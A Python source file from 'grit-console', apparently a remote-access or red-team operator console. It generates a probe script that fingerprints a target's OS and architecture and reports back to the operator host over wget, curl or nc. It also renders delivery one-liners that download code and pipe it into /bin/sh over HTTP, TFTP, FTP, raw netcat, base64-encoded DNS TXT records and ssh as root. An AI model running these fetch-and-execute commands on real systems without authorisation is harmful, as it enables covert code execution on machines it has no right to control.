"""Probe target command rendering helpers for grit-console."""

import base64

from .bridge_routes import attach_target_route_fields, target_route_context
from .config_utils import DEFAULT_CONFIG
from .operator_network import operator_advertised_host
from .record_utils import record_count_by_key, records_by_key
from .shell_utils import shquote
from .workflow_support import workflow_fleet_metrics


def probe_route_context(cfg, host=None, port=None):
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = port or cfg.get("GRIT_PROBE_PORT", 22207)
    return target_route_context(cfg, "probe", direct_host=direct_host, direct_port=direct_port)


def probe_script_fn(cfg, host, port):
    name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    url = f"http://{host}:{port}/probe/result"
    return f"""#!/bin/sh
bb_sanitize() {{
    printf '%s' "$1" | tr ' /:&?=%' '_______'
}}
bb_uname_s=$(uname -s 2>/dev/null || printf unknown)
bb_uname_m=$(uname -m 2>/dev/null || printf unknown)
bb_uname_r=$(uname -r 2>/dev/null || printf unknown)
bb_word_bits=unknown
bb_endian=unknown
bb_probe_byte=unknown
bb_word_bits=$(getconf LONG_BIT 2>/dev/null) || bb_word_bits=unknown
if [ -z "$bb_word_bits" ] || [ "$bb_word_bits" = "unknown" ]; then
    bb_word_bits=unknown
    case "$bb_uname_m" in
        mips64*|aarch64|x86_64|amd64|ia64|ppc64*|s390x|riscv64) bb_word_bits=64 ;;
        mips|mipsel|armv*|i[3-6]86|i86pc|ppc|powerpc) bb_word_bits=32 ;;
    esac
fi
if command -v od >/dev/null 2>&1; then
    bb_probe_byte=$(printf '\\001\\000' | od -An -tx1 2>/dev/null | tr -d ' \\t\\n' | cut -c1-2)
fi
if [ "$bb_probe_byte" = "unknown" ] || [ -z "$bb_probe_byte" ]; then
    if command -v hexdump >/dev/null 2>&1; then
        bb_probe_byte=$(printf '\\001\\000' | hexdump -e '1/1 "%02x"' 2>/dev/null | cut -c1-2)
    fi
fi
case "$bb_probe_byte" in
    01) bb_endian=little ;;
    00) bb_endian=big ;;
esac
if [ "$bb_endian" = "unknown" ]; then
    case "$bb_uname_m" in
        mipsel|mips64el|x86_64|i[3-6]86|aarch64|armv*|amd64|riscv*|ppc64le) bb_endian=little ;;
        mips|mips64|ppc|ppc64|s390*|sparc*) bb_endian=big ;;
    esac
fi
bb_payload="schema=1&script={name}&uname_s=$(bb_sanitize "$bb_uname_s")&uname_m=$(bb_sanitize "$bb_uname_m")&uname_r=$(bb_sanitize "$bb_uname_r")&word_bits=$(bb_sanitize "$bb_word_bits")&endian=$(bb_sanitize "$bb_endian")"
printf '%s\\n' "grit probe"
printf '%s\\n' "uname_s=$bb_uname_s"
printf '%s\\n' "uname_m=$bb_uname_m"
printf '%s\\n' "uname_r=$bb_uname_r"
printf '%s\\n' "word_bits=$bb_word_bits"
printf '%s\\n' "endian=$bb_endian"
if command -v wget >/dev/null 2>&1; then
    wget -qO- --post-data "$bb_payload" "{url}" >/dev/null 2>&1 && exit 0
    wget -qO /dev/null --post-data "$bb_payload" "{url}" 2>/dev/null && exit 0
    wget -qO- "{url}?$bb_payload" >/dev/null 2>&1 && exit 0
    wget -qO /dev/null "{url}?$bb_payload" 2>/dev/null && exit 0
fi
if command -v curl >/dev/null 2>&1; then
    curl -fsS -X POST -d "$bb_payload" "{url}" >/dev/null 2>&1 && exit 0
fi
if command -v nc >/dev/null 2>&1; then
    bb_host=$(printf '%s' "{url}" | sed 's|http://||;s|/.*||;s|:.*||')
    bb_port=$(printf '%s' "{url}" | sed 's|http://[^:]*:||;s|/.*||')
    bb_path=$(printf '%s' "{url}" | sed 's|http://[^/]*/|/|')
    bb_len=$(printf '%s' "$bb_payload" | wc -c | tr -d ' ')
    printf 'POST %s HTTP/1.0\\r\\nHost: %s:%s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %s\\r\\nConnection: close\\r\\n\\r\\n%s' \\
        "$bb_path" "$bb_host" "$bb_port" "$bb_len" "$bb_payload" | nc "$bb_host" "$bb_port" >/dev/null 2>&1 && exit 0
fi
printf '%s\\n' "probe upload failed: no usable wget, curl, or nc" >&2
exit 1
"""


def render_probe_paste(script_text):
    script_text = str(script_text or "").rstrip()
    delimiter = "GRIT_PROBE_SCRIPT"
    while delimiter in script_text:
        delimiter += "_END"
    return "\n".join([
        "",
        "Serial/manual paste:",
        f"sh <<'{delimiter}'",
        script_text,
        delimiter,
        "",
        "After it runs, use: listener probe results",
    ])


def render_probe_base64_paste(script_text):
    script_text = str(script_text or "").rstrip()
    encoded = base64.b64encode(script_text.encode("utf-8")).decode("ascii")
    delimiter = "GRIT_PROBE_B64"
    while delimiter in encoded:
        delimiter += "_END"
    lines = [
        "",
        "Serial/manual base64 paste:",
        "bb_probe_b64=$(cat <<'" + delimiter + "'",
    ]
    lines.extend(encoded[idx:idx + 76] for idx in range(0, len(encoded), 76))
    lines.extend([
        delimiter,
        ")",
        "if printf '' | base64 -d >/dev/null 2>&1; then",
        "  printf '%s' \"$bb_probe_b64\" | tr -d '\\n' | base64 -d | /bin/sh",
        "elif printf '' | base64 -D >/dev/null 2>&1; then",
        "  printf '%s' \"$bb_probe_b64\" | tr -d '\\n' | base64 -D | /bin/sh",
        "else",
        "  echo 'base64 decoder not found' >&2; exit 1",
        "fi",
        "",
        "After it runs, use: listener probe results",
    ])
    return "\n".join(lines)


def print_line_probe_script(cfg, *, paste=False, base64_mode=False):
    route = probe_route_context(cfg)
    route_host = str(route.get("host", "OPERATOR_IP") or "OPERATOR_IP")
    route_port = int(route.get("port", cfg.get("GRIT_PROBE_PORT", 22207)) or 22207)
    script_text = probe_script_fn(cfg, route_host, route_port).rstrip()
    if base64_mode:
        print(render_probe_base64_paste(script_text))
        return
    if paste:
        print(render_probe_paste(script_text))
        return
    print(script_text)


def render_probe_delivery(cfg):
    """Render target-side probe delivery options."""
    wget_cmd = render_probe_command(cfg)
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    route = probe_route_context(cfg)
    route_host = str(route.get("host", "OPERATOR_IP") or "OPERATOR_IP")
    route_port = int(route.get("port", 22207) or 22207)
    url = f"http://{route_host}:{route_port}/{script_name}"
    curl_cmd = f"curl -fsSL {shquote(url)} | /bin/sh"
    tftp_cmd = render_probe_tftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
    ftp_cmd = render_probe_ftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_FTP_PORT", 22209))
    dns_cmd = render_probe_dns_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_DNS_PORT", 22210))
    nc_cmd = (
        "printf 'GET /"
        + script_name.replace("'", "")
        + " HTTP/1.0\\r\\nHost: "
        + route_host.replace("'", "")
        + "\\r\\n\\r\\n' | nc "
        + shquote(route_host)
        + " "
        + shquote(str(route_port))
        + " | sed '1,/^\\r*$/d' | /bin/sh"
    )
    return "\n".join([
        "",
        "  Delivery options (pick what the target has):",
        f"    wget:  {wget_cmd}",
        f"    curl:  {curl_cmd}",
        f"    tftp:  {tftp_cmd}",
        f"    ftp:   {ftp_cmd}",
        f"    dns:   {dns_cmd}",
        f"    nc:    {nc_cmd}",
        f"    ssh:   ssh root@target '{wget_cmd}'",
        f"    copy:  scp <(curl -s {shquote(url)}) root@target:/tmp/probe.sh && ssh root@target 'sh /tmp/probe.sh'",
        "    paste: listener probe paste",
        "",
        "  Current listeners: probe-http, probe-tftp, probe-ftp, probe-dns",
        "  DNS note: nslookup usually needs DNS exposed on port 53; dig can use custom ports.",
        "  If HTTP is blocked but nc works, use the nc command above against the same listener.",
        "  If the target only has a serial/admin shell, use: listener probe paste",
        "",
        "  listener probe results  — after running any of the above",
    ])


def print_probe_delivery(cfg):
    """Print all the ways to get probe.sh running on a target."""
    print(render_probe_delivery(cfg))


def parse_line_probe_args(args):
    queue = False
    start_service = False
    for item in args:
        lower = str(item).lower()
        if lower in {"--queue", "-q", "queue"}:
            queue = True
        elif lower in {"--start", "--start-service", "start"}:
            start_service = True
        elif lower in {"show", "command"}:
            continue
        else:
            raise ValueError(
                "usage:\n"
                "  listener probe\n"
                "  listener probe start\n"
                "  listener probe queue"
            )
    return queue, start_service


def parse_line_probe_command(cmd, args=None):
    if args is None:
        args = cmd
    else:
        if str(cmd or "").strip().lower() != "probe":
            return {}
    args = list(args or [])
    subcmd = str(args[0]).lower() if args else ""
    rest = args[1:]
    if subcmd in {"results", "result"}:
        return {"action": "results"}
    if subcmd == "config":
        return {"action": "config", "args": rest}
    if subcmd == "clear":
        return {"action": "clear", "args": rest}
    if subcmd == "serve":
        return {"action": "serve", "args": rest}
    if subcmd in {"delivery", "deliver", "commands"}:
        if rest:
            raise ValueError("usage: listener probe delivery")
        return {"action": "delivery"}
    if subcmd in {"paste", "serial", "heredoc"}:
        base64_mode = False
        for item in rest:
            lower = str(item).lower()
            if lower in {"--base64", "base64", "-b"}:
                base64_mode = True
            else:
                raise ValueError(
                    "usage:\n"
                    "  listener probe paste\n"
                    "  listener probe paste base64"
                )
        return {"action": "paste", "base64": base64_mode}
    if subcmd in {"script", "raw"}:
        if rest:
            raise ValueError("usage: listener probe script")
        return {"action": "script"}
    if subcmd in {"help", "-h", "--help"}:
        return {"action": "help"}
    if subcmd in {"options", "option", "settings"}:
        if rest:
            raise ValueError("usage: listener probe options")
        return {"action": "options"}
    queue_probe, start_probe = parse_line_probe_args(args)
    return {
        "action": "start",
        "set_context": not subcmd,
        "queue": queue_probe,
        "start_service": start_probe,
    }


def parse_line_listener_probe_command(cmd, args=None):
    """Parse listener-scoped probe commands.

    `listener probe` by itself remains a listener selection handled by the
    navigation dispatcher. Subcommands here mirror the old top-level probe
    workflow so the interactive surface can live under listeners.
    """
    if args is None:
        args = cmd
        cmd = "listener"
    if str(cmd or "").strip().lower() not in {"listener", "listeners", "service", "services"}:
        return {}
    args = list(args or [])
    if not args or str(args[0]).strip().lower() not in {
        "probe", "probe-http", "http-probe",
    }:
        return {}
    rest = args[1:]
    if not rest:
        return {}
    parsed = parse_line_probe_command("probe", rest)
    if parsed:
        parsed["listener_scoped"] = True
    return parsed


def dispatch_line_probe_command(
    probe_cmd,
    *,
    set_context_func=None,
    results_func=None,
    config_func=None,
    clear_func=None,
    serve_func=None,
    delivery_func=None,
    paste_func=None,
    script_func=None,
    help_func=None,
    options_func=None,
    start_func=None,
):
    action = (probe_cmd or {}).get("action")
    try:
        if action == "results" and results_func:
            if set_context_func:
                set_context_func("probe")
            return results_func()
        if action == "config" and config_func:
            return config_func(probe_cmd.get("args") or [])
        if action == "clear" and clear_func:
            return clear_func(probe_cmd.get("args") or [])
        if action == "serve" and serve_func:
            return serve_func(probe_cmd.get("args") or [])
        if action == "delivery" and delivery_func:
            if set_context_func:
                set_context_func("probe")
            return delivery_func()
        if action == "paste" and paste_func:
            return paste_func(base64_mode=bool(probe_cmd.get("base64")))
        if action == "script" and script_func:
            return script_func()
        if action == "help" and help_func:
            return help_func("listeners")
        if action == "options" and options_func:
            if set_context_func and not probe_cmd.get("listener_scoped"):
                set_context_func("probe")
            return options_func()
        if action == "start" and start_func:
            if probe_cmd.get("set_context") and set_context_func:
                set_context_func("probe")
            return start_func(
                queue=bool(probe_cmd.get("queue")),
                start_service=bool(probe_cmd.get("start_service")),
            )
    except ValueError as exc:
        print(exc)
        return None
    raise ValueError("unsupported probe command")


def dispatch_legacy_probe_number(
    choice,
    cfg,
    *,
    input_func,
    snapshot_func,
    append_event_fn,
    start_service_func,
):
    if choice != "19":
        return False

    snap = snapshot_func(cfg)
    actions_by_id = snap.get("probe_workflow_actions_by_id") or {}
    show_action = actions_by_id.get("probe:show-probe-command") or {}
    start_action = actions_by_id.get("probe:start-probe") or {}
    rec = show_action or (snap.get("probe_workflow_actions") or [{}])[0]
    argv_extra = []
    if cfg.get("bridge_profile"):
        argv_extra.extend(["--bridge-profile", str(cfg.get("bridge_profile"))])
    headless = start_action.get("headless_command") or start_action.get("command") or (
        "scripts/grit-console --config "
        + shquote(str(cfg.get("_config_path", DEFAULT_CONFIG)))
        + " --transport probe"
    )
    print("Probe:")
    if rec:
        print(f"  target_command: {rec.get('target_command', '')}")
        print(f"  route={rec.get('route_kind', '')} bridge_profile={rec.get('bridge_profile', '') or '-'}")
        if rec.get("bridge_route_path"):
            print(f"  path={rec.get('bridge_route_path', '')}")
        print(f"  probe_workflow_actions: {len(snap.get('probe_workflow_actions') or [])}")
        print(f"  fleet_pending_work={rec.get('fleet_mailbox_pending_work_count', 0)} offline_targets={rec.get('fleet_offline_target_count', 0)} poll_overdue={rec.get('fleet_poll_overdue_target_count', 0)}")
        print(f"  show_action_state={show_action.get('operator_action_state', '') or '-'} reason={show_action.get('operator_action_reason', '') or '-'}")
        print(f"  start_action_state={start_action.get('operator_action_state', '') or '-'} reason={start_action.get('operator_action_reason', '') or '-'}")
    else:
        print("  target_command: unavailable")
    start_line = input_func("start probe listener now? [y/N]> ")
    if start_line is not None and start_line.strip().lower() in ("y", "yes"):
        append_event_fn(cfg, "workbench", "workbench_probe_started", details={
            "headless_command": headless,
            "target_command": rec.get("target_command", "") if rec else "",
            "route_kind": rec.get("route_kind", "") if rec else "",
            "bridge_profile": rec.get("bridge_profile", "") if rec else "",
            "probe_workflow_action_count": len(snap.get("probe_workflow_actions") or []),
        })
        start_service_func(
            cfg,
            "probe",
            argv_extra=argv_extra,
            headless_command=headless,
        )
    return True


def parse_line_survey_args(args):
    return parse_line_probe_args(args)


def parse_line_survey_command(cmd, args=None):
    if args is None:
        args = cmd
    else:
        if str(cmd or "").strip().lower() != "survey":
            return {}
    args = list(args or [])
    subcmd = str(args[0]).lower() if args else ""
    rest = args[1:]
    if subcmd in {"results", "result"} or not subcmd:
        return {"action": "results"}
    if subcmd == "config":
        return {"action": "config", "args": rest}
    if subcmd == "preset":
        return {"action": "preset", "args": rest}
    if subcmd in {"help", "-h", "--help"}:
        return {"action": "help"}
    raise ValueError(
        "usage:\n"
        "  survey\n"
        "  survey results\n"
        "  survey config\n"
        "  survey preset name NAME\n"
        "  survey ?"
    )


def dispatch_line_survey_command(
    survey_cmd,
    *,
    set_context_func=None,
    results_func=None,
    config_func=None,
    preset_func=None,
    help_func=None,
):
    action = (survey_cmd or {}).get("action")
    try:
        if action == "results" and results_func:
            if set_context_func:
                set_context_func("survey")
            return results_func()
        if action == "config" and config_func:
            return config_func(survey_cmd.get("args") or [])
        if action == "preset" and preset_func:
            return preset_func(survey_cmd.get("args") or [])
        if action == "help" and help_func:
            return help_func("survey")
    except ValueError as exc:
        print(exc)
        return None
    raise ValueError("unsupported survey command")


def render_probe_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    route = probe_route_context(cfg, host=host, port=port)
    url = f"http://{route.get('host', 'OPERATOR_IP')}:{route.get('port', 22207)}/{script_name}"
    return f"wget -O- {shquote(url)} | /bin/sh"


def render_probe_tftp_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    safe_local_name = script_name.replace("'", "").replace("/", "_") or "probe.sh"
    local_path = f"/tmp/{safe_local_name}"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
    return f"tftp -g -r {shquote(script_name)} -l {shquote(local_path)} {shquote(direct_host)} {shquote(str(direct_port))} && /bin/sh {shquote(local_path)}"


def render_probe_ftp_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_FTP_PORT", 22209))
    url = f"ftp://{direct_host}:{direct_port}/{script_name}"
    return f"wget -O- {shquote(url)} | /bin/sh"


def render_probe_dns_command(cfg, host=None, port=None):
    dns_name = str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit")).strip().strip(".") or "probe.grit"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_DNS_PORT", 22210))
    if direct_port == 53:
        return f"nslookup -type=TXT {shquote(dns_name)} {shquote(direct_host)} | sed -n 's/.*\"\\(.*\\)\".*/\\1/p' | tr -d '\\n' | base64 -d | /bin/sh"
    return f"dig @{shquote(direct_host)} -p {shquote(str(direct_port))} +short TXT {shquote(dns_name)} | tr -d '\" \\n' | base64 -d | /bin/sh"


def probe_workflow_run_command(base_command, bridge_arg, action_id, extra_args=""):
    command = (
        str(base_command)
        + str(bridge_arg or "")
        + " --run-probe-workflow-action "
        + shquote(f"probe:{action_id}")
    )
    if extra_args:
        command += str(extra_args)
    return command


def probe_workflow_action_record(
    action_id,
    category,
    label,
    command,
    run_command,
    service_row,
    target_command,
    script_name,
    listen_host,
    listen_port,
    fleet_metrics,
    action_state,
    action_reason,
    available=True,
    requires_confirmation=False,
    can_run_from_curses_enter=False,
    curses_enter_action="",
):
    service_row = service_row or {}
    return {
        "id": f"probe:{action_id}",
        "action_id": action_id,
        "service": "probe",
        "actual": str(service_row.get("actual") or "unknown"),
        "category": category,
        "workflow": "probe",
        "label": label,
        "command": command,
        "headless_command": command,
        "run_command": run_command,
        "target_command": target_command,
        "script_name": str(script_name or "probe.sh").lstrip("/") or "probe.sh",
        "listen_host": str(listen_host or ""),
        "listen_port": listen_port,
        **(fleet_metrics or {}),
        "available": bool(available),
        "requires_input": False,
        "requires_confirmation": bool(requires_confirmation),
        "requires_target_online": False,
        "queues_offline_work": False,
        "target_phone_home_required": True,
        "operator_action_state": action_state,
        "operator_action_reason": action_reason,
        "can_run_from_curses_enter": bool(can_run_from_curses_enter),
        "curses_enter_action": curses_enter_action,
        "execution_default": "show-command",
        "target_execution": False,
        "tui_visible": True,
        "safety_boundary": "operator-side probe service; target execution still requires explicit target-side wget pipe",
    }


def probe_listener_action_states(service_row):
    actual = str((service_row or {}).get("actual") or "unknown")
    listening = actual == "listening"
    return {
        "start_state": "already-running" if listening else "ready",
        "start_reason": "service-already-listening" if listening else "run-now",
        "start_enter": not listening,
        "stop_state": "ready" if listening else "already-stopped",
        "stop_reason": "run-now" if listening else "service-not-listening",
        "stop_enter": listening,
    }


def probe_workflow_action_records(cfg, service_row=None, targets=None):
    context = _probe_workflow_action_context(cfg, service_row=service_row, targets=targets)
    base = context["base"]
    bridge_arg = context["bridge_arg"]
    service_row = context["service_row"]
    lifecycle_states = context["lifecycle_states"]
    records = []

    _append_probe_workflow_action_record(
        records,
        context,
        "inspect-probe",
        "inspect",
        "Inspect probe route and target command",
        base + " --status",
        "ready",
        "run-now",
    )
    _append_probe_workflow_action_record(
        records,
        context,
        "show-target-command",
        "survey",
        "Show target-side probe command",
        base + " --status",
        "ready",
        "show-command",
        can_run_from_curses_enter=True,
        curses_enter_action="show-target-command",
    )
    _append_probe_workflow_action_record(
        records,
        context,
        "start-probe",
        "survey",
        "Start probe listener",
        context["start_command"],
        lifecycle_states["start_state"],
        lifecycle_states["start_reason"],
        can_run_from_curses_enter=lifecycle_states["start_enter"],
        curses_enter_action="start-probe" if lifecycle_states["start_enter"] else "stop-probe",
    )
    _append_probe_workflow_action_record(
        records,
        context,
        "stop-probe",
        "survey",
        "Stop probe listener",
        base + " --stop",
        lifecycle_states["stop_state"],
        lifecycle_states["stop_reason"],
        requires_confirmation=True,
        can_run_from_curses_enter=lifecycle_states["stop_enter"],
        curses_enter_action="stop-probe" if lifecycle_states["stop_enter"] else "start-probe",
    )
    if records:
        records[-1]["run_command"] = probe_workflow_run_command(
            base,
            bridge_arg,
            "stop-probe",
            " --confirm-probe-workflow-action",
        )
    records.sort(key=lambda rec: (rec.get("category", ""), rec.get("action_id", "")))
    return records


def _probe_workflow_action_context(cfg, service_row=None, targets=None):
    config_path = str(cfg.get("_config_path", DEFAULT_CONFIG))
    base = "scripts/grit-console --config " + shquote(config_path)
    bridge_arg = (" --bridge-profile " + shquote(str(cfg.get("bridge_profile")))) if cfg.get("bridge_profile") else ""
    service_row = service_row if isinstance(service_row, dict) else {}
    port = int(cfg.get("GRIT_PROBE_PORT", service_row.get("port", 22207)) or 22207)
    host = operator_advertised_host(cfg)
    route = probe_route_context(cfg, host=host, port=port)
    target_command = render_probe_command(cfg, host=host, port=port)
    start_parts = ["scripts/grit-console", "--config", config_path, "--transport", "probe"]
    if cfg.get("bridge_profile"):
        start_parts.extend(["--bridge-profile", str(cfg.get("bridge_profile"))])
    start_command = " ".join(shquote(str(item)) for item in start_parts)
    stop_command = base + " --stop"
    target_records = [rec for rec in (targets or []) if isinstance(rec, dict)]
    fleet_metrics = workflow_fleet_metrics(target_records)
    lifecycle_states = probe_listener_action_states(service_row)
    return {
        "base": base,
        "bridge_arg": bridge_arg,
        "service_row": service_row,
        "target_command": target_command,
        "probe_name": cfg.get("GRIT_PROBE_NAME", "probe.sh"),
        "listen_host": cfg.get("listen_host") or service_row.get("bind_address") or "",
        "port": port,
        "fleet_metrics": fleet_metrics,
        "route": route,
        "start_command": start_command,
        "lifecycle_states": lifecycle_states,
    }


def _append_probe_workflow_action_record(
    records,
    context,
    action_id,
    category,
    label,
    command,
    action_state,
    action_reason,
    available=True,
    requires_confirmation=False,
    can_run_from_curses_enter=False,
    curses_enter_action="",
):
    records.append(attach_target_route_fields(probe_workflow_action_record(
        action_id,
        category,
        label,
        command,
        probe_workflow_run_command(context["base"], context["bridge_arg"], action_id),
        context["service_row"],
        context["target_command"],
        context["probe_name"],
        context["listen_host"],
        context["port"],
        context["fleet_metrics"],
        action_state,
        action_reason,
        available=available,
        requires_confirmation=requires_confirmation,
        can_run_from_curses_enter=can_run_from_curses_enter,
        curses_enter_action=curses_enter_action,
    ), context["route"]))


def probe_workflow_action_indexes(records):
    return {
        "probe_workflow_actions_by_id": {rec.get("id", ""): rec for rec in records or [] if rec.get("id")},
        "probe_workflow_actions_by_action_id": records_by_key(records, "action_id"),
        "probe_workflow_actions_by_category": records_by_key(records, "category"),
        "probe_workflow_actions_by_workflow": records_by_key(records, "workflow"),
        "probe_workflow_actions_by_actual": records_by_key(records, "actual"),
        "probe_workflow_actions_by_route_kind": records_by_key(records, "route_kind"),
        "probe_workflow_actions_by_bridge_profile": records_by_key(records, "bridge_profile"),
        "probe_workflow_actions_by_requires_bridge": records_by_key(records, "requires_bridge"),
        "probe_workflow_actions_by_fleet_target_count": records_by_key(records, "fleet_target_count"),
        "probe_workflow_actions_by_fleet_offline_target_count": records_by_key(records, "fleet_offline_target_count"),
        "probe_workflow_actions_by_fleet_stale_target_count": records_by_key(records, "fleet_stale_target_count"),
        "probe_workflow_actions_by_fleet_mailbox_pending_target_count": records_by_key(records, "fleet_mailbox_pending_target_count"),
        "probe_workflow_actions_by_fleet_mailbox_pending_work_count": records_by_key(records, "fleet_mailbox_pending_work_count"),
        "probe_workflow_actions_by_fleet_poll_overdue_target_count": records_by_key(records, "fleet_poll_overdue_target_count"),
        "probe_workflow_actions_by_fleet_has_offline_targets": records_by_key(records, "fleet_has_offline_targets"),
        "probe_workflow_actions_by_fleet_has_stale_targets": records_by_key(records, "fleet_has_stale_targets"),
        "probe_workflow_actions_by_fleet_has_mailbox_pending_work": records_by_key(records, "fleet_has_mailbox_pending_work"),
        "probe_workflow_actions_by_fleet_has_poll_overdue_targets": records_by_key(records, "fleet_has_poll_overdue_targets"),
        "probe_workflow_actions_by_available": records_by_key(records, "available"),
        "probe_workflow_actions_by_requires_confirmation": records_by_key(records, "requires_confirmation"),
        "probe_workflow_actions_by_target_phone_home_required": records_by_key(records, "target_phone_home_required"),
        "probe_workflow_actions_by_operator_action_state": records_by_key(records, "operator_action_state"),
        "probe_workflow_actions_by_operator_action_reason": records_by_key(records, "operator_action_reason"),
        "probe_workflow_actions_by_can_run_from_curses_enter": records_by_key(records, "can_run_from_curses_enter"),
        "probe_workflow_actions_by_curses_enter_action": records_by_key(records, "curses_enter_action"),
    }


def probe_workflow_action_summary(records):
    return {
        "total_count": len(records or []),
        "available_count": len([rec for rec in records or [] if rec.get("available") is True]),
        "requires_confirmation_count": len([rec for rec in records or [] if rec.get("requires_confirmation") is True]),
        "target_phone_home_required_count": len([rec for rec in records or [] if rec.get("target_phone_home_required") is True]),
        "can_run_from_curses_enter_count": len([rec for rec in records or [] if rec.get("can_run_from_curses_enter") is True]),
        "action_counts": record_count_by_key(records, "action_id"),
        "category_counts": record_count_by_key(records, "category"),
        "workflow_counts": record_count_by_key(records, "workflow"),
        "actual_counts": record_count_by_key(records, "actual"),
        "route_kind_counts": record_count_by_key(records, "route_kind"),
        "bridge_profile_counts": record_count_by_key(records, "bridge_profile"),
        "requires_bridge_counts": record_count_by_key(records, "requires_bridge"),
        "fleet_target_count_counts": record_count_by_key(records, "fleet_target_count"),
        "fleet_offline_target_count_counts": record_count_by_key(records, "fleet_offline_target_count"),
        "fleet_stale_target_count_counts": record_count_by_key(records, "fleet_stale_target_count"),
        "fleet_mailbox_pending_target_count_counts": record_count_by_key(records, "fleet_mailbox_pending_target_count"),
        "fleet_mailbox_pending_work_count_counts": record_count_by_key(records, "fleet_mailbox_pending_work_count"),
        "fleet_poll_overdue_target_count_counts": record_count_by_key(records, "fleet_poll_overdue_target_count"),
        "fleet_has_offline_targets_counts": record_count_by_key(records, "fleet_has_offline_targets"),
        "fleet_has_stale_targets_counts": record_count_by_key(records, "fleet_has_stale_targets"),
        "fleet_has_mailbox_pending_work_counts": record_count_by_key(records, "fleet_has_mailbox_pending_work"),
        "fleet_has_poll_overdue_targets_counts": record_count_by_key(records, "fleet_has_poll_overdue_targets"),
        "operator_action_state_counts": record_count_by_key(records, "operator_action_state"),
        "operator_action_reason_counts": record_count_by_key(records, "operator_action_reason"),
        "can_run_from_curses_enter_counts": record_count_by_key(records, "can_run_from_curses_enter"),
        "curses_enter_action_counts": record_count_by_key(records, "curses_enter_action"),
    }


def probe_workflow_action_status_summary(records):
    summary = probe_workflow_action_summary(records)
    return {
        "probe_workflow_action_count": summary.get("total_count", 0),
        "probe_workflow_action_available_count": summary.get("available_count", 0),
        "probe_workflow_action_requires_confirmation_count": summary.get("requires_confirmation_count", 0),
        "probe_workflow_action_target_phone_home_required_count": summary.get("target_phone_home_required_count", 0),
        "probe_workflow_action_can_run_from_curses_enter_count": summary.get("can_run_from_curses_enter_count", 0),
        "probe_workflow_action_action_counts": summary.get("action_counts") or {},
        "probe_workflow_action_category_counts": summary.get("category_counts") or {},
        "probe_workflow_action_workflow_counts": summary.get("workflow_counts") or {},
        "probe_workflow_action_actual_counts": summary.get("actual_counts") or {},
        "probe_workflow_action_route_kind_counts": summary.get("route_kind_counts") or {},
        "probe_workflow_action_bridge_profile_counts": summary.get("bridge_profile_counts") or {},
        "probe_workflow_action_requires_bridge_counts": summary.get("requires_bridge_counts") or {},
        "probe_workflow_action_fleet_target_count_counts": summary.get("fleet_target_count_counts") or {},
        "probe_workflow_action_fleet_offline_target_count_counts": summary.get("fleet_offline_target_count_counts") or {},
        "probe_workflow_action_fleet_stale_target_count_counts": summary.get("fleet_stale_target_count_counts") or {},
        "probe_workflow_action_fleet_mailbox_pending_target_count_counts": summary.get("fleet_mailbox_pending_target_count_counts") or {},
        "probe_workflow_action_fleet_mailbox_pending_work_count_counts": summary.get("fleet_mailbox_pending_work_count_counts") or {},
        "probe_workflow_action_fleet_poll_overdue_target_count_counts": summary.get("fleet_poll_overdue_target_count_counts") or {},
        "probe_workflow_action_fleet_has_offline_targets_counts": summary.get("fleet_has_offline_targets_counts") or {},
        "probe_workflow_action_fleet_has_stale_targets_counts": summary.get("fleet_has_stale_targets_counts") or {},
        "probe_workflow_action_fleet_has_mailbox_pending_work_counts": summary.get("fleet_has_mailbox_pending_work_counts") or {},
        "probe_workflow_action_fleet_has_poll_overdue_targets_counts": summary.get("fleet_has_poll_overdue_targets_counts") or {},
        "probe_workflow_action_operator_action_state_counts": summary.get("operator_action_state_counts") or {},
        "probe_workflow_action_operator_action_reason_counts": summary.get("operator_action_reason_counts") or {},
        "probe_workflow_action_can_run_from_curses_enter_counts": summary.get("can_run_from_curses_enter_counts") or {},
        "probe_workflow_action_curses_enter_action_counts": summary.get("curses_enter_action_counts") or {},
    }
